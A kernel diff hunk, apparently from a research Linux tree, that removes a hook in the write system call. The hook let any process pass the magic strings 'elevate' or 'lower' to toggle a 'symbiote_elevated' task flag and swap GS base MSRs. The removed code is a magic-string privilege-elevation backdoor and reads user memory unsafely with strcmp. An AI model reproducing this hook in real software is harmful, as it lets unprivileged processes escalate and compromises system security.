@@ -664,62 +664,10 @@ ssize_t ksys_write(unsigned int fd, const char __user *buf, size_t count)
 	return ret;
 }
 
-unsigned long kernel_gs_base_elevate, user_gs_base_elevate;
-
-int magic_check_elevate(void);
-int magic_check_elevate(){
-  return current->symbiote_elevated;
-}
-
-void magic_lower(void);
-void magic_lower(){
-  // Set to lowered if set.
-  if(current->symbiote_elevated == 1 ){
-    current->symbiote_elevated = 0;
-    /* printk("Unset symbiote_elevated flag of task struct\n"); */
-  } else{
-    printk("Trying to lower non elevated task???\n");
-  }
-
-  // Write it into the msr
-  wrmsrl(MSR_KERNEL_GS_BASE, user_gs_base_elevate);
-}
-
-void magic_elevate(void);
-void magic_elevate(){
-
-  // Set to elevated if unset.
-  if(current->symbiote_elevated == 1 ){
-    printk("Already Elevated????\n");
-  } else{
-    current->symbiote_elevated = 1;
-    /* printk("Set symbiote_elevated flag of task struct\n"); */
-  }
-
-  // Read current GS_BASE
-  rdmsrl(MSR_GS_BASE, kernel_gs_base_elevate);
-
-  // NOTE: this looks super wrong, but we think is right
-  rdmsrl(MSR_KERNEL_GS_BASE, user_gs_base_elevate);
-
-  // Write it into the msr
-  wrmsrl(MSR_KERNEL_GS_BASE, kernel_gs_base_elevate);
-}
 
 SYSCALL_DEFINE3(write, unsigned int, fd, const char __user *, buf,
 		size_t, count)
 {
-  // Fn name is __do_sys_write
-
-  if(count == 7 && !strcmp(buf, "elevate")){
-    /* printk("found magic elevate string\n"); */
-    magic_elevate();
-    return 7;
-  }else if (count == 5 && !strcmp(buf, "lower") ){
-    /* printk("found magic lower string\n"); */
-    magic_lower();
-    return 5;
-  }
   return ksys_write(fd, buf, count);
 }
 
